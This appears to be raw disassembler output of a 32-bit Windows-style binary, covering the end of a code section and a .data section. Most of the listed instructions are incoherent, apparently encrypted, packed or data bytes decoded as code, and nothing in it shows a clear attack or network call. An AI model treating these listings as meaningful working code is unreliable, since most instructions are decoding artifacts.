  411265:	mov    BYTE PTR [ebp-0x7b],bl
  411268:	test   al,0xc5
  41126a:	cli    
  41126b:	cwde   
  41126c:	ds pop edx
  41126e:	jo     0x411291
  411270:	add    al,0x19
  411272:	and    esp,DWORD PTR [ecx]
  411274:	imul   ecx,DWORD PTR [eax+0x59],0xfffffff1
  411278:	sub    eax,eax
  41127a:	jns    0x41126e
  41127c:	imul   edi,DWORD PTR [ecx-0x2],0xffffff93
  411280:	or     al,0x6f
  411282:	push   eax
  411283:	mov    BYTE PTR [edi-0x2b2ef007],dl
  411289:	or     dh,BYTE PTR [eax]
  41128b:	mov    BYTE PTR [edi-0x78],bl
  41128e:	inc    ecx
  41128f:	cmp    eax,0xdfbf20c3
  411294:	rcl    ecx,cl
  411296:	mov    WORD PTR [edx+0x53],ds
  411299:	jmp    0x581161bb
  41129e:	fwait
  41129f:	dec    ebx
  4112a0:	outs   dx,DWORD PTR ds:[esi]
  4112a1:	sbb    al,dl
  4112a3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4112a4:	xlat   BYTE PTR ds:[ebx]
  4112a5:	push   ds
  4112a6:	out    dx,eax
  4112a7:	hlt    
  4112a8:	push   di
  4112aa:	cmp    edi,DWORD PTR [edi+0x16]
  4112ad:	xor    BYTE PTR [edi+0x5b1cf864],dl
  4112b3:	fcomp  QWORD PTR [edx]
  4112b5:	dec    ecx
  4112b6:	hlt    
  4112b7:	shl    DWORD PTR [edi+esi*8],cl
  4112ba:	mov    edi,0xfd034ae8
  4112bf:	imul   esi,edi,0x71c3c06d
  4112c5:	pusha  
  4112c6:	and    bl,BYTE PTR [ebx]
  4112c8:	and    edx,ebp
  4112ca:	xor    dh,BYTE PTR [edi]
  4112cc:	or     eax,0xccf93b14
  4112d1:	outs   dx,DWORD PTR ds:[esi]
  4112d2:	mov    dh,0x9a
  4112d4:	mov    ebx,0x8eded677
  4112d9:	jno    0x4112ba
  4112db:	out    dx,eax
  4112dc:	pusha  
  4112dd:	jp     0x411307
  4112df:	mov    ch,0xf
  4112e1:	pop    edi
  4112e2:	xchg   DWORD PTR [edi-0x7b],esi
  4112e5:	(bad)  
  4112e6:	fistp  QWORD PTR [edi-0x1d6a6372]
  4112ec:	push   ss
  4112ed:	dec    esi
  4112ee:	xor    al,0xf3
  4112f0:	imul   ecx,DWORD PTR [ebx+eiz*4-0x61],0x1
  4112f5:	adc    bh,dh
  4112f7:	test   DWORD PTR [edi],ecx
  4112f9:	cli    
  4112fa:	mov    esi,0xfc5f115c
  4112ff:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411300:	test   BYTE PTR [eax-0x5],ah
  411303:	(bad)  
  411304:	jnp    0x4112c3
  411306:	call   0xa0ca:0x38687a27
  41130d:	push   esi
  41130e:	jnp    0x4112b7
  411310:	push   0x61
  411312:	push   eax
  411313:	xchg   BYTE PTR [edx+ecx*4-0x64edd2f4],ch
  41131a:	jno    0x411380
  41131c:	jb     0x4112b0
  41131e:	ins    DWORD PTR es:[edi],dx
  41131f:	inc    edx
  411320:	scas   al,BYTE PTR es:[edi]
  411321:	fld    QWORD PTR [ebx-0x6d]
  411324:	mov    dl,BYTE PTR [esi+ebp*4+0x6a590a6a]
  41132b:	add    al,0x5b
  41132d:	inc    ebx
  41132e:	xchg   ebx,ecx
  411330:	sub    ebx,ecx
  411332:	xchg   ebx,ecx
  411334:	dec    ecx
  411335:	mov    eax,DWORD PTR [ebp-0x1c]
  411338:	imul   eax,ecx
  41133b:	add    esp,eax
  41133d:	xchg   edx,eax
  41133e:	push   eax
  41133f:	xor    ebx,ebx
  411341:	mov    edx,esp
  411343:	jmp    0x41147e
  411348:	sub    BYTE PTR [edi+0x7165615e],cl
  41134e:	xor    ebx,DWORD PTR [ebp-0x7b]
  411351:	into   
  411352:	jge    0x411370
  411354:	ja     0x4113b4
  411356:	xchg   edx,eax
  411357:	or     BYTE PTR [ebp+0x43],0x7c
  41135b:	jl     0x41136f
  41135d:	jg     0x4113db
  41135f:	jl     0x411320
  411361:	jp     0x41135e
  411363:	xchg   esp,eax
  411364:	mov    edi,0x27f1964f
  411369:	jle    0x411325
  41136b:	mov    al,0x32
  41136d:	ss pop ecx
  41136f:	and    eax,0x43d70d4
  411374:	std    
  411375:	retf   
  411376:	dec    ebx
  411377:	in     al,dx
  411378:	xchg   esp,eax
  411379:	xchg   ebp,eax
  41137a:	cld    
  41137b:	jle    0x411398
  41137d:	or     al,0xe5
  41137f:	lahf   
  411380:	mov    WORD PTR [ebx+eax*4+0x61],ss
  411384:	jg     0x41132c
  411386:	outs   dx,BYTE PTR ds:[esi]
  411387:	fadd   DWORD PTR [esi+0x72d4d316]
  41138d:	in     al,0x39
  41138f:	in     al,dx
  411390:	xchg   esi,eax
  411392:	jae    0x4113a2
  411394:	aam    0x50
  411396:	jns    0x411417
  411398:	sub    esp,DWORD PTR [ebx]
  41139a:	fcomip st,st(5)
  41139c:	push   0xc3e5a2ab
  4113a1:	retf   
  4113a2:	sub    eax,0x6f00a4fd
  4113a7:	sub    BYTE PTR [edi+0x60a625f4],cl
  4113ad:	xor    DWORD PTR [ecx],0x3
  4113b0:	push   esp
  4113b1:	cmp    DWORD PTR [edx+0x23],eax
  4113b4:	jmp    0xb75b:0x9548e7d1
  4113bb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4113bc:	pop    ecx
  4113bd:	sub    eax,0x7add1e26
  4113c2:	repnz lods al,BYTE PTR ds:[esi]
  4113c4:	rol    BYTE PTR [ecx],cl
  4113c6:	push   cs
  4113c7:	xchg   edi,eax
  4113c8:	pop    ss
  4113c9:	xchg   ebx,eax
  4113ca:	popa   
  4113cb:	popa   
  4113cc:	push   edx
  4113cd:	aad    0xec
  4113cf:	mov    bl,0x5a
  4113d1:	mov    al,0x7e
  4113d3:	iret   
  4113d4:	arpl   WORD PTR [ebx],bp
  4113d6:	bound  esi,QWORD PTR [ebx+0x3b718b35]
  4113dc:	push   es
  4113dd:	inc    edi
  4113de:	lods   al,BYTE PTR ds:[esi]
  4113df:	sbb    bh,BYTE PTR [edx+0x18]
  4113e2:	mov    bl,0x0
  4113e4:	jb     0x411383
  4113e6:	mov    dh,0x86
  4113e8:	mov    edi,0x1b276695
  4113ed:	sti    
  4113ee:	push   es
  4113ef:	add    al,0x49
  4113f1:	adc    eax,0x3a74b182
  4113f6:	cld    
  4113f7:	cmovnp ebp,esp
  4113fa:	mov    esp,0xf5bebfba
  4113ff:	mov    cl,ch
  411401:	mov    ah,0x4b
  411403:	pop    esp
  411404:	popa   
  411405:	sti    
  411406:	or     DWORD PTR [ebx-0x28],esp
  411409:	dec    esp
  41140a:	mov    eax,0x14b95cd6
  41140f:	mov    dl,0xe7
  411411:	lea    edi,[eax-0x426138d7]
  411417:	sub    BYTE PTR ds:0x3a138ac4,dl
  41141d:	cli    
  41141e:	add    dh,al
  411420:	push   edi
  411421:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411422:	pop    edx
  411423:	ret    0x7006
  411426:	ss in  al,0x50
  411429:	push   ds
  41142a:	xchg   esp,eax
  41142b:	xchg   esi,eax
  41142c:	lds    esp,FWORD PTR [esi+esi*1]
  41142f:	push   es
  411430:	mov    edx,0x805afb8c
  411435:	mov    ds:0x355e6378,al
  41143a:	add    bh,BYTE PTR [esi-0x1c]
  41143d:	dec    edx
  41143e:	mov    dl,0xfc
  411440:	dec    esp
  411441:	jo     0x411457
  411443:	xor    ebx,eax
  411445:	xor    dh,dl
  411447:	push   ss
  411448:	mov    esi,0xc1ff9d3d
  41144d:	jp     0x411404
  41144f:	test   al,ch
  411451:	and    BYTE PTR [edi],0x6c
  411454:	adc    al,0xdc
  411456:	imul   edx,edi,0xffffffee
  411459:	add    eax,0xa10593dd
  41145e:	in     al,0x91
  411460:	ja     0x4113f8
  411462:	and    DWORD PTR [esi-0x3da8d993],ecx
  411468:	jmp    0x411423
  41146a:	pop    edi
  41146b:	in     al,dx
  41146c:	leave  
  41146d:	into   
  41146e:	inc    ebp
  41146f:	(bad)  
  411470:	jle    0x41148e
  411472:	int3   
  411473:	test   al,0x4d
  411475:	adc    esp,edx
  411477:	bound  edi,QWORD PTR [eax+0x60a11f1a]
  41147d:	fs dec edx
  41147f:	inc    ebx
  411480:	add    ebx,DWORD PTR [edx+ebx*1]
  411483:	dec    ebx
  411484:	xor    edx,edx
  411486:	add    DWORD PTR [ebp-0xc],ebx
  411489:	pop    ebx
  41148a:	mov    eax,DWORD PTR [ebp-0xc]
  41148d:	pop    edi
  41148e:	pop    esi
  41148f:	pop    ebx
  411490:	leave  
  411491:	ret    0x10

Disassembly of section .data:

00412000 <.data>:
  412000:	and    BYTE PTR [ecx],ch
  412002:	add    DWORD PTR [eax],eax
  412004:	sub    ch,BYTE PTR [ecx]
  412006:	add    DWORD PTR [eax],eax
  412008:	xor    al,0x29
  41200a:	add    DWORD PTR [eax],eax
  41200c:	inc    eax
  41200d:	sub    DWORD PTR [ecx],eax
  41200f:	add    BYTE PTR [edx+0x29],cl
  412012:	add    DWORD PTR [eax],eax
  412014:	pop    eax
  412015:	sub    DWORD PTR [ecx],eax
  412017:	add    BYTE PTR [edx+0x29],ah
  41201a:	add    DWORD PTR [eax],eax
  41201c:	je     0x412047
  41201e:	add    DWORD PTR [eax],eax
  412020:	jle    0x41204b
  412022:	add    DWORD PTR [eax],eax
  412024:	mov    WORD PTR [ecx],gs
  412026:	add    DWORD PTR [eax],eax
  412028:	xchg   esi,eax
  412029:	sub    DWORD PTR [ecx],eax
  41202b:	add    BYTE PTR [esi-0x4ffffed7],ah
  412031:	sub    DWORD PTR [ecx],eax
  412033:	add    BYTE PTR [ecx+ebp*1+0x29c60001],bh
  41203a:	add    DWORD PTR [eax],eax
  41203c:	aam    0x29
  41203e:	add    DWORD PTR [eax],eax
  412040:	loopne 0x41206b
  412042:	add    DWORD PTR [eax],eax
  412044:	jmp    0x129:0xf2000129
  41204b:	add    BYTE PTR [eax],al
  41204d:	sub    al,BYTE PTR [ecx]
  41204f:	add    BYTE PTR [edx],cl
  412051:	sub    al,BYTE PTR [ecx]
  412053:	add    BYTE PTR [edx+ebp*1],dl
  412056:	add    DWORD PTR [eax],eax
  412058:	and    ch,BYTE PTR [edx]
  41205a:	add    DWORD PTR [eax],eax
  41205c:	sub    al,0x2a
  41205e:	add    DWORD PTR [eax],eax
  412060:	xor    al,0x2a
  412062:	add    DWORD PTR [eax],eax
  412064:	inc    eax
  412065:	sub    al,BYTE PTR [ecx]
  412067:	add    BYTE PTR [edx+0x2a],cl
  41206a:	add    DWORD PTR [eax],eax
  41206c:	push   esp
  41206d:	sub    al,BYTE PTR [ecx]
  41206f:	add    BYTE PTR [esi+0x2a],bl
  412072:	add    DWORD PTR [eax],eax
  412074:	data16 sub al,BYTE PTR [ecx]
  412077:	add    BYTE PTR [eax+0x2a],dh
  41207a:	add    DWORD PTR [eax],eax
  41207c:	jp     0x4120a8
  41207e:	add    DWORD PTR [eax],eax
  412080:	sub    BYTE PTR [edx],0x1
  412083:	add    BYTE PTR [esi-0x65fffed6],cl
  412089:	sub    al,BYTE PTR [ecx]
  41208b:	add    BYTE PTR [edx-0x53fffed6],ah
  412091:	sub    al,BYTE PTR [ecx]
  412093:	add    BYTE PTR [edx+ebp*1+0x2ac00001],dh
  41209a:	add    DWORD PTR [eax],eax
  41209c:	retf   0x12a
  41209f:	add    ah,dl
  4120a1:	sub    al,BYTE PTR [ecx]
  4120a3:	add    dh,bl
  4120a5:	sub    al,BYTE PTR [ecx]
  4120a7:	add    dl,dh
  4120a9:	sub    al,BYTE PTR [ecx]
  4120ab:	add    dh,bh
  4120ad:	sub    al,BYTE PTR [ecx]
  4120af:	add    BYTE PTR [eax],al
  4120b1:	add    BYTE PTR [eax],al
  4120b3:	add    BYTE PTR [edx],bl
  4120b5:	sub    eax,DWORD PTR [ecx]
  4120b7:	add    BYTE PTR [esi],ch
  4120b9:	sub    eax,DWORD PTR [ecx]
  4120bb:	add    BYTE PTR [esi],bh
  4120bd:	sub    eax,DWORD PTR [ecx]
  4120bf:	add    BYTE PTR [ebx+ebp*1+0x1],cl
  4120c3:	add    BYTE PTR [eax+0x2b],bl
  4120c6:	add    DWORD PTR [eax],eax
  4120c8:	push   0x7e00012b
  4120cd:	sub    eax,DWORD PTR [ecx]
  4120cf:	add    BYTE PTR [edx-0x59fffed5],dl
  4120d5:	sub    eax,DWORD PTR [ecx]
  4120d7:	add    BYTE PTR [ebx+ebp*1+0x2bca0001],bh
  4120de:	add    DWORD PTR [eax],eax
  4120e0:	loopne 0x41210d
  4120e2:	add    DWORD PTR [eax],eax
  4120e4:	in     al,dx
  4120e5:	sub    eax,DWORD PTR [ecx]
  4120e7:	add    dh,bh
  4120e9:	sub    eax,DWORD PTR [ecx]
  4120eb:	add    BYTE PTR [esi],dl
  4120ed:	sub    al,0x1
  4120ef:	add    BYTE PTR [eax],ch
  4120f1:	sub    al,0x1
  4120f3:	add    BYTE PTR [eax],bh
  4120f5:	sub    al,0x1
  4120f7:	add    BYTE PTR [edx+0x2c],al
  4120fa:	add    DWORD PTR [eax],eax
  4120fc:	pop    eax
  4120fd:	sub    al,0x1
  4120ff:	add    BYTE PTR [edx+0x2c],dh
  412102:	add    DWORD PTR [eax],eax
  412104:	jle    0x412132
  412106:	add    DWORD PTR [eax],eax
  412108:	mov    ch,BYTE PTR [ecx+eax*1]
  41210b:	add    BYTE PTR [esi-0x47fffed4],bl
  412111:	sub    al,0x1
  412113:	add    ah,al
  412115:	sub    al,0x1
  412117:	add    dl,dl
  412119:	sub    al,0x1
  41211b:	add    ah,ah
  41211d:	sub    al,0x1
  41211f:	add    al,dh
  412121:	sub    al,0x1
  412123:	add    BYTE PTR [esi],al
  412125:	sub    eax,0x2d140001
  41212a:	add    DWORD PTR [eax],eax
  41212c:	and    ch,BYTE PTR ds:0x2d300001
  412132:	add    DWORD PTR [eax],eax
  412134:	dec    edx
  412135:	sub    eax,0x2d5e0001
  41213a:	add    DWORD PTR [eax],eax
  41213c:	push   0x2d
  41213e:	add    DWORD PTR [eax],eax
  412140:	jp     0x41216f
  412142:	add    DWORD PTR [eax],eax
  412144:	xchg   esi,eax
  412145:	sub    eax,0x2da60001
  41214a:	add    DWORD PTR [eax],eax
  41214c:	mov    dh,0x2d
  41214e:	add    DWORD PTR [eax],eax
  412150:	(bad)  
  412151:	sub    eax,0x2dd20001
  412156:	add    DWORD PTR [eax],eax
  412158:	loop   0x412187
  41215a:	add    DWORD PTR [eax],eax
  41215c:	hlt    
  41215d:	sub    eax,0x2dfe0001
  412162:	add    DWORD PTR [eax],eax
  412164:	push   cs
  412165:	add    DWORD PTR cs:[eax],eax
  412168:	push   ds
  412169:	add    DWORD PTR cs:[eax],eax
  41216c:	sub    BYTE PTR [esi],ch
  41216e:	add    DWORD PTR [eax],eax
  412170:	add    BYTE PTR [eax],al
  412172:	add    BYTE PTR [eax],al
  412174:	dec    edx
  412175:	add    DWORD PTR cs:[eax],eax
  412178:	add    BYTE PTR [eax],al
  41217a:	add    BYTE PTR [eax],al
  41217c:	push   0x8000012e
  412181:	add    DWORD PTR cs:[eax],eax
  412184:	mov    WORD PTR [esi],gs
  412186:	add    DWORD PTR [eax],eax
  412188:	call   0x12e:0xb200012e
  41218f:	add    dh,al
  412191:	add    DWORD PTR cs:[eax],eax
  412194:	fsubr  QWORD PTR [esi]
  412196:	add    DWORD PTR [eax],eax
  412198:	call   0xf84122cb
  41219d:	add    DWORD PTR cs:[eax],eax
  4121a0:	adc    BYTE PTR [edi],ch
  4121a2:	add    DWORD PTR [eax],eax
  4121a4:	push   ds
  4121a5:	das    
  4121a6:	add    DWORD PTR [eax],eax
  4121a8:	xor    BYTE PTR [edi],ch
  4121aa:	add    DWORD PTR [eax],eax
  4121ac:	inc    eax
  4121ad:	das    
  4121ae:	add    DWORD PTR [eax],eax
  4121b0:	push   esi
  4121b1:	das    
  4121b2:	add    DWORD PTR [eax],eax
  4121b4:	data16 das 
  4121b6:	add    DWORD PTR [eax],eax
  4121b8:	jbe    0x4121e9
  4121ba:	add    DWORD PTR [eax],eax
  4121bc:	mov    ch,BYTE PTR [edi]
  4121be:	add    DWORD PTR [eax],eax
  4121c0:	xchg   esi,eax
  4121c1:	das    
  4121c2:	add    DWORD PTR [eax],eax
  4121c4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4121c5:	das    
  4121c6:	add    DWORD PTR [eax],eax
  4121c8:	mov    dl,0x2f
  4121ca:	add    DWORD PTR [eax],eax
  4121cc:	enter  0x12f,0x0
  4121d0:	loopne 0x412201
  4121d2:	add    DWORD PTR [eax],eax
  4121d4:	hlt    
  4121d5:	das    
  4121d6:	add    DWORD PTR [eax],eax
  4121d8:	add    dh,BYTE PTR [eax]
  4121da:	add    DWORD PTR [eax],eax
  4121dc:	sbb    BYTE PTR [eax],dh
  4121de:	add    DWORD PTR [eax],eax
  4121e0:	xor    BYTE PTR cs:[ecx],al
  4121e3:	add    BYTE PTR [edx],bh
  4121e5:	xor    BYTE PTR [ecx],al
  4121e7:	add    BYTE PTR [eax+0x30],cl
  4121ea:	add    DWORD PTR [eax],eax
  4121ec:	push   edx
  4121ed:	xor    BYTE PTR [ecx],al
  4121ef:	add    BYTE PTR [esi+0x30],ah
  4121f2:	add    DWORD PTR [eax],eax
  4121f4:	jbe    0x412226
  4121f6:	add    DWORD PTR [eax],eax
  4121f8:	mov    dh,BYTE PTR [eax]
  4121fa:	add    DWORD PTR [eax],eax
  4121fc:	pushf  
  4121fd:	xor    BYTE PTR [ecx],al
  4121ff:	add    BYTE PTR [eax-0x3bfffed0],dh
  412205:	xor    BYTE PTR [ecx],al
  412207:	add    ah,dl
  412209:	xor    BYTE PTR [ecx],al
  41220b:	add    dl,ch
  41220d:	xor    BYTE PTR [ecx],al
  41220f:	add    BYTE PTR [edx],al
  412211:	xor    DWORD PTR [ecx],eax
  412213:	add    BYTE PTR [edx],bl
  412215:	xor    DWORD PTR [ecx],eax
  412217:	add    BYTE PTR [esi],ah
  412219:	xor    DWORD PTR [ecx],eax
  41221b:	add    BYTE PTR [eax],bh
  41221d:	xor    DWORD PTR [ecx],eax
  41221f:	add    BYTE PTR [edx+0x31],cl
  412222:	add    DWORD PTR [eax],eax
  412224:	push   esi
  412225:	xor    DWORD PTR [ecx],eax
  412227:	add    BYTE PTR [eax+0x31],ch
  41222a:	add    DWORD PTR [eax],eax
  41222c:	jbe    0x41225f
  41222e:	add    DWORD PTR [eax],eax
  412230:	xor    BYTE PTR [ecx],0x1
  412233:	add    BYTE PTR [esi-0x59fffecf],dl
  412239:	xor    DWORD PTR [ecx],eax
  41223b:	add    BYTE PTR [eax-0x2dfffecf],bh
  412241:	xor    DWORD PTR [ecx],eax
  412243:	add    dl,ch
  412245:	xor    DWORD PTR [ecx],eax
  412247:	add    BYTE PTR [eax],al
  412249:	add    BYTE PTR [eax],al
  41224b:	add    BYTE PTR [esi],al
  41224d:	xor    al,BYTE PTR [ecx]
  41224f:	add    BYTE PTR [edx+esi*1],bl
  412252:	add    DWORD PTR [eax],eax
  412254:	xor    dh,BYTE PTR [edx]
  412256:	add    DWORD PTR [eax],eax
  412258:	inc    edx
  412259:	xor    al,BYTE PTR [ecx]
  41225b:	add    BYTE PTR [edx+0x32],dl
  41225e:	add    DWORD PTR [eax],eax
  412260:	pusha  
  412261:	xor    al,BYTE PTR [ecx]
  412263:	add    BYTE PTR [eax+0x32],dh
  412266:	add    DWORD PTR [eax],eax
  412268:	test   BYTE PTR [edx],dh
  41226a:	add    DWORD PTR [eax],eax
  41226c:	xchg   esp,eax
  41226d:	xor    al,BYTE PTR [ecx]
  41226f:	add    BYTE PTR [eax-0x41fffece],ch
  412275:	xor    al,BYTE PTR [ecx]
  412277:	add    ah,cl
  412279:	xor    al,BYTE PTR [ecx]
  41227b:	add    al,ah
  41227d:	xor    al,BYTE PTR [ecx]
  41227f:	add    al,dh
  412281:	xor    al,BYTE PTR [ecx]
  412283:	add    BYTE PTR [edx],al
  412285:	xor    eax,DWORD PTR [ecx]
  412287:	add    BYTE PTR [edx],bl
  412289:	xor    eax,DWORD PTR [ecx]
  41228b:	add    BYTE PTR [esi],ah
  41228d:	xor    eax,DWORD PTR [ecx]
  41228f:	add    BYTE PTR [ebx+esi*1],dh
  412292:	add    DWORD PTR [eax],eax
  412294:	inc    esp
  412295:	xor    eax,DWORD PTR [ecx]
  412297:	add    BYTE PTR [edx+0x33],dl
  41229a:	add    DWORD PTR [eax],eax
  41229c:	push   0x7a000133
  4122a1:	xor    eax,DWORD PTR [ecx]
  4122a3:	add    BYTE PTR [esi-0x6bfffecd],al
  4122a9:	xor    eax,DWORD PTR [ecx]
  4122ab:	add    BYTE PTR [esi-0x4bfffecd],ah
  4122b1:	xor    eax,DWORD PTR [ecx]
  4122b3:	add    dh,al
  4122b5:	xor    eax,DWORD PTR [ecx]
  4122b7:	add    al,bl
  4122b9:	xor    eax,DWORD PTR [ecx]
  4122bb:	add    dl,ch
  4122bd:	xor    eax,DWORD PTR [ecx]
  4122bf:	add    dl,bh
  4122c1:	xor    eax,DWORD PTR [ecx]
  4122c3:	add    BYTE PTR [esi],al
  4122c5:	xor    al,0x1
  4122c7:	add    BYTE PTR [esp+esi*1],bl
  4122ca:	add    DWORD PTR [eax],eax
  4122cc:	cmp    BYTE PTR [ecx+eax*1],dh
  4122cf:	add    BYTE PTR [edx+0x34],dl
  4122d2:	add    DWORD PTR [eax],eax
  4122d4:	data16 xor al,0x1
  4122d7:	add    BYTE PTR [esp+esi*1+0x1],dh
  4122db:	add    BYTE PTR [eax-0x6dfffecc],al
  4122e1:	xor    al,0x1
  4122e3:	add    BYTE PTR [edx-0x51fffecc],ah
  4122e9:	xor    al,0x1
  4122eb:	add    BYTE PTR [edx-0x37fffecc],bh
  4122f1:	xor    al,0x1
  4122f3:	add    al,ah
  4122f5:	xor    al,0x1
  4122f7:	add    al,dh
  4122f9:	xor    al,0x1
  4122fb:	add    BYTE PTR [eax],cl
  4122fd:	xor    eax,0x351a0001
  412302:	add    DWORD PTR [eax],eax
  412304:	sub    dh,BYTE PTR ds:0x35380001
  41230a:	add    DWORD PTR [eax],eax
  41230c:	dec    edx
  41230d:	xor    eax,0x35580001
  412312:	add    DWORD PTR [eax],eax
  412314:	fs xor eax,0x35720001
  41231a:	add    DWORD PTR [eax],eax
  41231c:	jl     0x412353
  41231e:	add    DWORD PTR [eax],eax
  412320:	xchg   esp,eax
  412321:	xor    eax,0x35a40001
  412326:	add    DWORD PTR [eax],eax
  412328:	mov    ah,0x35
  41232a:	add    DWORD PTR [eax],eax
  41232c:	ret    0x135
  41232f:	add    al,dl
  412331:	xor    eax,0x35e00001
  412336:	add    DWORD PTR [eax],eax
  412338:	div    BYTE PTR ds:0x36080001
  41233e:	add    DWORD PTR [eax],eax
  412340:	push   ss
  412341:	add    DWORD PTR ss:[eax],eax
  412344:	sub    al,0x36
  412346:	add    DWORD PTR [eax],eax
  412348:	cmp    dh,BYTE PTR [esi]
  41234a:	add    DWORD PTR [eax],eax
  41234c:	push   edx
  41234d:	add    DWORD PTR ss:[eax],eax
  412350:	pop    esi
  412351:	add    DWORD PTR ss:[eax],eax
  412354:	push   0x36
  412356:	add    DWORD PTR [eax],eax
  412358:	jbe    0x412390
  41235a:	add    DWORD PTR [eax],eax
  41235c:	test   BYTE PTR [esi],dh
  41235e:	add    DWORD PTR [eax],eax
  412360:	xchg   esi,eax
  412361:	add    DWORD PTR ss:[eax],eax
  412364:	mov    ds:0xb4000136,al
  412369:	add    DWORD PTR ss:[eax],eax
  41236c:	shl    BYTE PTR [esi],0x1
  41236f:	add    dh,cl
  412371:	add    DWORD PTR ss:[eax],eax
  412374:	fdiv   QWORD PTR [esi]
  412376:	add    DWORD PTR [eax],eax
  412378:	call   0xf64124b3
  41237d:	add    DWORD PTR ss:[eax],eax
  412380:	add    al,0x37
  412382:	add    DWORD PTR [eax],eax
  412384:	adc    al,0x37
  412386:	add    DWORD PTR [eax],eax
  412388:	es aaa 
  41238a:	add    DWORD PTR [eax],eax
  41238c:	cmp    al,0x37
  41238e:	add    DWORD PTR [eax],eax
  412390:	inc    esi
  412391:	aaa    
  412392:	add    DWORD PTR [eax],eax
  412394:	push   esp
  412395:	aaa    
  412396:	add    DWORD PTR [eax],eax
  412398:	fs aaa 
  41239a:	add    DWORD PTR [eax],eax
  41239c:	jbe    0x4123d5
  41239e:	add    DWORD PTR [eax],eax
  4123a0:	test   BYTE PTR [edi],dh
  4123a2:	add    DWORD PTR [eax],eax
  4123a4:	cwde   
  4123a5:	aaa    
  4123a6:	add    DWORD PTR [eax],eax
  4123a8:	mov    dl,0x37
  4123aa:	add    DWORD PTR [eax],eax
  4123ac:	les    esi,FWORD PTR [edi]
  4123ae:	add    DWORD PTR [eax],eax
  4123b0:	aam    0x37
  4123b2:	add    DWORD PTR [eax],eax
  4123b4:	call   0xfa4124f0
  4123b9:	aaa    
  4123ba:	add    DWORD PTR [eax],eax
  4123bc:	or     bh,BYTE PTR [eax]
  4123be:	add    DWORD PTR [eax],eax
  4123c0:	push   ss
  4123c1:	cmp    BYTE PTR [ecx],al
  4123c3:	add    BYTE PTR [eax+edi*1],dh
  4123c6:	add    DWORD PTR [eax],eax
  4123c8:	inc    esi
  4123c9:	cmp    BYTE PTR [ecx],al
  4123cb:	add    BYTE PTR [eax+edi*1+0x1],bl
  4123cf:	add    BYTE PTR [eax+0x38],bh
  4123d2:	add    DWORD PTR [eax],eax
  4123d4:	nop
  4123d5:	cmp    BYTE PTR [ecx],al
  4123d7:	add    BYTE PTR [eax+edi*1+0x38b00001],bl
  4123de:	add    DWORD PTR [eax],eax
  4123e0:	mov    edx,0xc8000138
  4123e5:	cmp    BYTE PTR [ecx],al
  4123e7:	add    ah,ah
  4123e9:	cmp    BYTE PTR [ecx],al
  4123eb:	add    dl,dh
  4123ed:	cmp    BYTE PTR [ecx],al
  4123ef:	add    BYTE PTR [esi],al
  4123f1:	cmp    DWORD PTR [ecx],eax
  4123f3:	add    BYTE PTR [eax],bl
  4123f5:	cmp    DWORD PTR [ecx],eax
  4123f7:	add    BYTE PTR [edx],ch
  4123f9:	cmp    DWORD PTR [ecx],eax
  4123fb:	add    BYTE PTR [edx],bh
  4123fd:	cmp    DWORD PTR [ecx],eax
  4123ff:	add    BYTE PTR [eax+0x39],dl
  412402:	add    DWORD PTR [eax],eax
  412404:	cmp    WORD PTR [ecx],ax
	...
  41240f:	add    dh,cl
  412411:	add    al,cl
  412413:	dec    ebp
  412414:	add    BYTE PTR [eax],al
  412416:	add    BYTE PTR [eax],al
  412418:	add    al,BYTE PTR [eax]
  41241a:	add    BYTE PTR [eax],al
  41241c:	dec    ebp
  41241d:	add    BYTE PTR [eax],al
  41241f:	add    BYTE PTR [edx],bh
  412421:	cmp    DWORD PTR [ebx],eax
  412423:	add    BYTE PTR [edx],bh
  412425:	and    eax,DWORD PTR [ebx]
	...
  41242f:	add    dh,cl
  412431:	add    al,cl
  412433:	dec    ebp
  412434:	add    BYTE PTR [eax],al
  412436:	add    BYTE PTR [eax],al
  412438:	pop    esi
  412439:	and    al,0x1
  41243b:	add    BYTE PTR [ecx],al
  41243d:	add    BYTE PTR [eax],al
  41243f:	add    BYTE PTR [ecx],al
  412441:	add    BYTE PTR [eax],al
  412443:	add    BYTE PTR [ecx],al
  412445:	add    BYTE PTR [eax],al
  412447:	add    BYTE PTR [esp+0x1],dl
  41244b:	add    BYTE PTR [eax+0x24],bl
  41244e:	add    DWORD PTR [eax],eax
  412450:	pop    esp
  412451:	and    al,0x1
  412453:	add    BYTE PTR [esi+0x6f000032],al
  412459:	and    al,0x1
  41245b:	add    BYTE PTR [eax],al
  41245d:	add    BYTE PTR [esi+0x64],ch
  412460:	jae    0x4124d4
  412462:	bound  esp,QWORD PTR [esi+0x64]
  412465:	push   edi
  412466:	inc    si
  412468:	popa   
  412469:	xor    al,0x2e
  41246b:	je     0x4124dc
  41246d:	jo     0x41246f
  41246f:	aas    
  412470:	dec    eax
  412471:	imul   esp,DWORD PTR [ebp+eiz*2+0x50],0x746e696f
  412479:	gs jb  0x4124cb
  41247c:	jb     0x4124e7
  41247e:	imul   ebp,DWORD PTR [bp+0x61],0x5940406c
  412486:	inc    edi
  412487:	inc    esi
  412488:	dec    ebx
  412489:	push   eax
  41248a:	inc    ecx
  41248b:	dec    ecx
  41248c:	push   eax
  41248d:	inc    ecx
  41248e:	inc    esp
  41248f:	cmp    al,0x56
	...
  412499:	add    BYTE PTR [eax],al
  41249b:	add    BYTE PTR [eiz*1+0x1],dl
  4124a2:	add    BYTE PTR [eax],al
  4124a4:	add    BYTE PTR [eax],al
  4124a6:	add    BYTE PTR [eax],al
  4124a8:	push   cs
  4124a9:	sub    eax,DWORD PTR [ecx]
  4124ab:	add    BYTE PTR [eax],al
  4124ad:	and    BYTE PTR [ecx],al
  4124af:	add    al,cl
  4124b1:	and    eax,0x1
  4124b6:	add    BYTE PTR [eax],al
  4124b8:	add    BYTE PTR [eax],al
  4124ba:	add    BYTE PTR [eax],al
  4124bc:	inc    eax
  4124bd:	add    DWORD PTR cs:[eax],eax
  4124c0:	mov    ah,0x20
  4124c2:	add    DWORD PTR [eax],eax
  4124c4:	mov    BYTE PTR [esi],ah
  4124c6:	add    DWORD PTR [eax],eax
	...
  4124d0:	pop    esp
  4124d1:	add    DWORD PTR cs:[eax],eax
  4124d4:	je     0x4124f7
  4124d6:	add    DWORD PTR [eax],eax
  4124d8:	nop
  4124d9:	add    DWORD PTR es:[eax],eax
	...
  4124e4:	clc    
  4124e5:	xor    DWORD PTR [ecx],eax
